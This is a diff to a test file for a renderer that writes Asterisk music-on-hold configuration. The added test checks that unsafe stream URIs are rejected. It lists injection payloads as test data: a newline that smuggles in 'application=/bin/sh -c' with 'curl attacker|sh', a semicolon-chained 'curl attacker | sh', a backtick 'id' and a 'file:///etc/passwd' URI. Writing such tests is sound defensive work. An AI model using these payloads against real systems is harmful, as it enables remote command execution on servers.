@@ -93,9 +93,41 @@ describe("renderMusicOnHoldConf", () => {
 			mohRow({ source: "stream", streamUri: "http://radio.example/stream", fileCount: 0 }),
 		]);
 		expect(result.body).to.contain("mode=custom");
-		expect(result.body).to.contain("application=/usr/bin/mpg123");
+		// The URI is the ARGUMENT. A trailing `-` reads stdin, which nothing writes to, so the class
+		// used to decode an empty stream and serve silence — the exact failure the file exists to stop.
+		expect(result.body).to.contain(
+			"application=/usr/bin/mpg123 -q -s --rate 8000 --mono http://radio.example/stream",
+		);
+		expect(result.body).to.not.contain("--mono -\n");
 		expect(result.body).to.not.contain("mode=files\ndirectory=/var/lib/optimiq/objects/moh");
 		expect(result.declared).to.deep.equal(["jazz"]);
+	});
+
+	/**
+	 * `streamUri` becomes an argument to `application=`, which `res_musiconhold` RUNS. The DTO refuses
+	 * these on write, and the renderer refuses them again because it also reads rows written before
+	 * that constraint existed or written around the API — an escape here is remote command execution
+	 * on the media server from a tenant-scoped permission.
+	 */
+	it("skips a stream class whose URI could break out of the generated line", () => {
+		const payloads = [
+			"http://x\napplication=/bin/sh -c 'curl attacker|sh'",
+			"http://x\r\n[default]",
+			"http://x; curl attacker | sh",
+			"http://x #comment",
+			"http://x`id`",
+			"file:///etc/passwd",
+			"http://x with spaces",
+		];
+		for (const streamUri of payloads) {
+			const result = render([mohRow({ source: "stream", streamUri, fileCount: 0 })]);
+			expect(result.declared, streamUri).to.deep.equal([]);
+			expect(
+				result.skipped.map((entry) => entry.reason),
+				streamUri,
+			).to.deep.equal(["unsafe-stream-uri"]);
+			expect(result.body, streamUri).to.not.contain("application=");
+		}
 	});
 
 	/**
